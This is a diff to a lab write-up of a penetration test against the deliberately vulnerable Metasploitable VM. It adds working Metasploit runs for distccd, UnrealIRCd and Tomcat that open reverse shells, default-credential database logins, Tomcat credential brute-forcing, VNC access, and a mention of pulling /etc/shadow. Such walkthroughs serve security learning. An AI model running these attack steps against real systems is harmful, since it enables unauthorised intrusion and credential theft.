@@ -506,7 +506,7 @@ vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                          
 ---------------------------------------------------------------------------------- ----------------------------------
 ```
 
-Jackpot! It appears that there is an exploit available for the particular version, 2.3.4, which is installed on this server. I decided at this point to migrate to using metasploit (this is "metasploit"able after all...) and use it to
+Jackpot! It appears that there is an exploit available for the particular version, 2.3.4, which is installed on this server. I decided at this point to migrate to using metasploit (this is "metasploit"able after all...) and use it to gain access to the system.
 
 ```
 root@kali:~# msfconsole
@@ -556,6 +556,8 @@ msf exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 2
 [*] Meterpreter session 3 opened (172.16.243.144:4433 -> 172.16.243.143:49559) at 2018-03-25 17:59:32 -0400
 [*] Command stager progress: 100.00% (773/773 bytes)
 ```
+
+#### Password Cracking the Local System Accounts
 
 This allowed me to connect to the system via meterpreter, and download the `/etc/passwd` and `/etc/shadow` files:
 
@@ -667,4 +669,309 @@ msfadmin@metasploitable:~$ sudo su -
 [sudo] password for msfadmin:
 root@metasploitable:~# id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+### MySQL
+
+The next service that I went after was the `mysql` service running on the host. The default credentials for that service can sometimes be username `root` with no password. In this case, it appeared that this default credential was in fact a viable option.
+
+```
+root@kali:~# mysql -u root -h target
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10
+Server version: 5.0.51a-3ubuntu5 (Ubuntu)
+
+Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| dvwa               |
+| metasploit         |
+| mysql              |
+| owasp10            |
+| tikiwiki           |
+| tikiwiki195        |
++--------------------+
+7 rows in set (0.00 sec)
+```
+
+This actually allowed me to see several users that were established in the MySQL database:
+
+```
+MySQL [(none)]> use mysql
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [mysql]> show tables;
++---------------------------+
+| Tables_in_mysql           |
++---------------------------+
+| columns_priv              |
+| db                        |
+| func                      |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| proc                      |
+| procs_priv                |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
+| user                      |
++---------------------------+
+17 rows in set (0.00 sec)
+
+MySQL [mysql]> select host, user, password from user;
++------+------------------+----------+
+| host | user             | password |
++------+------------------+----------+
+|      | debian-sys-maint |          |
+| %    | root             |          |
+| %    | guest            |          |
++------+------------------+----------+
+3 rows in set (0.00 sec)
+```
+
+### PostgreSQL
+
+Another database running on the target server was the postgresql database service. This was one that actually showed up when dumping and cracking the user account credentials earlier. By logging in with those credentials (`postgres` / `postgres`), it was possible to query the database for the users and their permissions, in this case there was only the one user, "postgres", a superuser for the database application.
+
+```
+root@kali:~# psql -h target -U postgres
+Password for user postgres:
+psql (10.1, server 8.3.1)
+SSL connection (protocol: TLSv1, cipher: DHE-RSA-AES256-SHA, bits: 256, compression: off)
+Type "help" for help.
+
+postgres=# \du
+                       List of roles
+ Role name |            Attributes             | Member of
+-----------+-----------------------------------+-----------
+ postgres  | Superuser, Create role, Create DB | {}
+
+```
+
+### distccd
+
+On a whim, I looked randomly at the `distccd` service running on port 3632 of the target system. A search in `searchsploit` didn't result in any hits:
+
+```
+root@kali:~# searchsploit distccd
+-------------------------------------------------------------------------------------------------------------- ----------------------------------
+ Exploit Title                                                                                                |  Path
+                                                                                                              | (/usr/share/exploitdb/)
+-------------------------------------------------------------------------------------------------------------- ----------------------------------
+-------------------------------------------------------------------------------------------------------------- ----------------------------------
+```
+
+But a search in Metasploit found an exploit for the DistCC Daemon. Unfortunately, it did not include any information about what versions this exploit would impact, but a shot-in-the-dark to run the exploit ended up successfully returning a shell:
+
+```
+msf > search distccd
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                           Disclosure Date  Rank       Description
+   ----                           ---------------  ----       -----------
+   exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution
+
+
+
+msf > use exploit/unix/misc/distcc_exec
+msf exploit(unix/misc/distcc_exec) > run
+
+[*] Started reverse TCP double handler on 172.16.243.144:4444
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo dvVvr9yfS55bmx5j;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "dvVvr9yfS55bmx5j\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 4 opened (172.16.243.144:4444 -> 172.16.243.143:35054) at 2018-03-25 18:45:45 -0400
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+hostname
+metasploitable
+```
+
+### Apache Tomcat/Coyote JSP engine 1.1
+
+Another service to look at was the Apache tomcat web server running on port 8180.
+
+```
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/5.5
+```
+
+```
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+msf auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
+rport => 8180
+msf auxiliary(scanner/http/tomcat_mgr_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:root (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:s3cret (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:root (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:tomcat (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:s3cret (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: manager:vagrant (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:root (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:tomcat (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:s3cret (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: role1:vagrant (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:root (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:tomcat (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:s3cret (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:vagrant (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: tomcat:root (Incorrect)
+[+] 172.16.243.143:8180 - Login Successful: tomcat:tomcat
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:admin (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:manager (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:root (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:tomcat (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:s3cret (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: both:vagrant (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: root:owaspbwa (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: xampp:xampp (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
+[-] 172.16.243.143:8180 - LOGIN FAILED: admin:vagrant (Incorrect)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Bingo! It turns out that one pair of default credentials, `tomcat` / `tomcat`, were bring using by the management interface for the Tomcat application. This further enabled the use of the `exploit/multi/http/tomcat_mgr_deploy` exploit to gain a shell on the target server:
+
+```
+msf auxiliary(scanner/http/tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_deploy
+msf exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername tomcat
+HttpUsername => tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword tomcat
+HttpPassword => tomcat
+msf exploit(multi/http/tomcat_mgr_deploy) > set rport 8180
+rport => 8180
+msf exploit(multi/http/tomcat_mgr_deploy) > run
+
+[*] Started reverse TCP handler on 172.16.243.144:4444
+[*] Attempting to automatically select a target...
+[*] Automatically selected target "Linux x86"
+[*] Uploading 6279 bytes as CmEAflXTKfIlg9DUi4VaKueJd7.war ...
+[*] Executing /CmEAflXTKfIlg9DUi4VaKueJd7/aB8I27TFaCcggxL7zt1BqigP.jsp...
+[*] Undeploying CmEAflXTKfIlg9DUi4VaKueJd7 ...
+[*] Sending stage (53837 bytes) to 172.16.243.143
+[*] Meterpreter session 6 opened (172.16.243.144:4444 -> 172.16.243.143:51511) at 2018-03-25 19:31:02 -0400
+
+meterpreter > getuid
+Server username: tomcat55
+meterpreter > getwd
+/
+```
+
+### UnrealIRCd
+
+Another service running on the target system was the UnrealIRCd daemon. A search in Metasploit turned up an exploit that leveraged a backdoor for remote command execution. Running this exploit against the target system returned a fresh shell, in this case another root process.
+
+```
+msf > search unrealircd
+
+Matching Modules
+================
+
+   Name                                        Disclosure Date  Rank       Description
+   ----                                        ---------------  ----       -----------
+   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP double handler on 172.16.243.144:4444
+[*] 172.16.243.143:6667 - Connected to 172.16.243.143:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 172.16.243.143:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo TGzZR4D3jPBPYfwb;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "TGzZR4D3jPBPYfwb\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 7 opened (172.16.243.144:4444 -> 172.16.243.143:60426) at 2018-03-25 20:04:59 -0400
+
+id
+uid=0(root) gid=0(root)
+hostname
+metasploitable
+```
+
+### VNC
+
+Running the default configuration of the `auxiliary/scanner/vnc/vnc_login` Metasploit module led to a successful login credential, using the basic password: `password`
+
+```
+msf > use auxiliary/scanner/vnc/vnc_login
+msf auxiliary(scanner/vnc/vnc_login) > run
+
+[*] 172.16.243.143:5900   - 172.16.243.143:5900 - Starting VNC login sweep
+[!] 172.16.243.143:5900   - No active DB -- Credential data will not be saved!
+[+] 172.16.243.143:5900   - 172.16.243.143:5900 - Login Successful: :password
+[*] 172.16.243.143:5900   - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+From my attacker machine, I could then leverage this credential to access the system directly:
+
+```
+root@kali:~# vncviewer target
+Connected to RFB server, using protocol version 3.3
+Performing standard VNC authentication
+Password:
+Authentication successful
+...
 ```
